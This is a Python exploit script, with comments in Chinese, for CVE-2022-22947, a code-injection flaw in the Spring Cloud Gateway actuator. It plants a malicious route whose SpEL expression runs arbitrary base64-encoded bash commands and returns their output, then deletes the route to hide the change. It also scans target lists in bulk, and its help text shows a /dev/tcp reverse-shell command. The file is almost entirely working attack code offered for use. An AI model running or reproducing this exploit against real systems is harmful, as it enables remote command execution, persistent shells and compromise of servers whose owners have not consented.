# auther:anan
# 欢迎各位关注微信公众号：小白学IT

import base64
import re
import requests
import json
import sys
import getopt

# 单个目标验证
def check(url,cmd):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    cmd = cmd.encode('utf-8')
    cmd = str(base64.b64encode(cmd))
    cmd = cmd.strip('b')
    cmd = cmd.strip("'")
    cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'
    # 原始payload,payload中执行cmd命令，在执行时替换需要执行的命令即可
    payload = {
        "id": "code",
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"" + cmd + "\").getInputStream()))}"
            }
        }],
        "uri": "http://example.com",
        "order": 0
    }


    re1 = requests.post(url=url + "/actuator/gateway/routes/check01",data=json.dumps(payload,ensure_ascii=False), headers=headers1, json=json)
    # print("正在刷新路由，使用新增的check01生效...")
    re2 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2)
    re3 = requests.get(url=url + "/actuator/gateway/routes/check01", headers=headers2, stream=True,allow_redirects=False)
    if re3.status_code == 200 and re3.text and "AddResponseHeader" in re3.text:
        # print("漏洞利用成功，请人工验证响应信息，确认是否为误报！")
        huixian = re.findall(r'AddResponseHeader Result = [\'"]?([^\'" )]+)', re3.text)
        print(f'[+]目标：%s ,成功获取回显命令：{huixian}' % url )
        # print("正在删除新增的恶意的路由check01.....")
        re4 = requests.delete(url=url + "/actuator/gateway/routes/check01", headers=headers2)
        # print("正在刷新路由，是删除路由操作生效...")
        re5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2)
    else:
        print("[-]目标：%s,漏洞验证失败，请手动验证!" % url)

# 控制批量漏洞验证
def more_check(txt):
    f = open(txt)
    f=f.readlines()
    for url in f:
        url = url.strip("\n")
        url = url.strip("/")
        check(url,"id")

# 控制脚本参数
def canshu():
    print('''
    验证单个目标：
            1、python cve-2022-22947.py  进入交互模式后，根据提示输入目标url和需要执行的命令，注意命令的正确性
            2、python cve-2022-22947.py  -u http://example.com -c whoami
        验证多个目标
            1、python cve-2022-22947.py -f url.txt ，将需要验证的目标全部放在url目录下
        反弹shell
            1、python cve-2022-22947.py  -u http://example.com -c "bash -i >& /dev/tcp/ip/port 0>&1"
            2、进入交互模式，输入目标和反弹shell的命令
    ''')
    url = ''
    comm = ''
    f = ''
    options, args = getopt.getopt(sys.argv[1:], "hu:f:c:", ["help", "url=", "file=", "comm="])
    for name, value in options:
        if name in ("-h", "--help"):
            print('''
        -u    指定单个url目标
        -f    指定目标url文件
        -c    指定需要执行的命令，不指定默认执行`id`
        ''')
        elif name == '-u' or name == "--url":
            url = value
        elif name == "-f" or name == '--file':
            f = value
        elif name == "-c" or name == "--comm":
            comm = value

    if url and comm == "":
        check(url, 'id')
    elif url and comm:
        check(url, comm)
    elif f:
        more_check(f)
    elif url == "" and f == "":
        url = input("请输入一个目标url地址：")
        cmd = input("请输入想要执行的命令，默认执行id：") or "id"
        check(url,cmd)

if __name__ == "__main__":
    canshu()



